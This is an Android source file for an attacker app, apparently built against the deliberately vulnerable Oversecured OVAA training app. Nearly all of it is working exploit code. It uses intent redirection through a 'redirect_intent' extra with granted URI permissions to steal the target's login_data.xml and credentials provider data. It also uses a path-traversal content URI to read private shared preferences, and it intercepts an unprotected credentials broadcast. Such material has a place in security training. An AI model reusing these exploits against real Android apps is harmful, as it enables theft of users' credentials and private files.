package oversecured.plugin.assassin;

import androidx.appcompat.app.AppCompatActivity;


import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

import oversecured.plugin.assassin.R;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        FileTheft();



//        test();
//                CredsTheft();
//        ReceiverRegister();
//        LoggerServiceAttack();
//        CopyTheftedFile();







    }


    private void LoggerServiceAttack(){
        Intent i = new Intent();
        i.setClassName(getPackageName(), "oversecured.plugin.assassin.ServiceDumpActivity");
        startActivity(i);
    }

    private void CopyTheftedFile()  {

        try {
            String uri = "content://oversecured.ovaa.theftoverwrite/..%2f..%2f..%2f..%2fdata%2fdata%2foversecured.ovaa%2fshared_prefs%2flogin_data.xml";
            File out = new File( "/tmp/" + System.currentTimeMillis());
            Log.d("fileout", String.valueOf(out));
            InputStream inputStream = getContentResolver().openInputStream(Uri.parse(uri));
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
            String read;
            while ((read = br.readLine()) != null) {
                sb.append(read);
            }
            br.close();
            Log.d("string", sb.toString());
            OutputStream outputStream = new FileOutputStream(out);
            Utils.copy(inputStream,outputStream);
            inputStream.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private void CredsTheft(){
        Intent next = new Intent("evil");
        next.setClassName(getPackageName(), "oversecured.plugin.assassin.LeakActivity");
        next.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION|Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
//        next.setData(Uri.parse("content://oversecured.ovaa.providers.CredentialsProvider/"));
        next.setData(Uri.parse("content://oversecured.ovaa.creds_provider/"));


        Intent intent = new Intent("oversecured.ovaa.action.LOGIN");
//        intent.setClassName("oversecured.ovaa", "oversecured.ovaa.action.LOGIN");
        intent.putExtra("redirect_intent", next);
        Log.d("dsadsa",intent.toString());
        startActivity(intent);
    }

    private void FileTheft(){
        Intent next = new Intent("evil");
        next.setClassName(getPackageName(), "oversecured.plugin.assassin.FileLeakActivity");
        next.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION|Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
//        next.setData(Uri.parse("content://oversecured.ovaa.providers.CredentialsProvider/"));
        next.setData(Uri.parse("content://oversecured.ovaa.fileprovider/root/data/data/oversecured.ovaa/shared_prefs/login_data.xml"));


        Intent intent = new Intent("oversecured.ovaa.action.LOGIN");
//        intent.setClassName("oversecured.ovaa", "oversecured.ovaa.action.LOGIN");
        intent.putExtra("redirect_intent", next);
        Log.d("dsadsa",intent.toString());
        startActivity(intent);
    }

    protected void ReceiverRegister(){
        BroadcastReceiver br = new UNPROTECTED_CREDENTIALS_DATA_Receiver();
        IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction("oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA");
        this.registerReceiver(br, filter);
    }

    private void test(){
        String uri1 = "content://oversecured.ovaa.theftoverwrite/..%2f1";
        String uri2 = "content://oversecured.ovaa.theftoverwrite/..%2f..%2f1";
        String uri3 = "content://oversecured.ovaa.theftoverwrite/..%2f..%2f..%2f1";
        File file = new File(Environment.getExternalStorageDirectory(), Uri.parse(uri1).getLastPathSegment());

        Log.d("file", String.valueOf(file));


        Log.d("uri1",Uri.parse(uri1).getLastPathSegment());
        Log.d("uri2",Uri.parse(uri2).getLastPathSegment());
        Log.d("uri3",Uri.parse(uri3).getLastPathSegment());
    }
}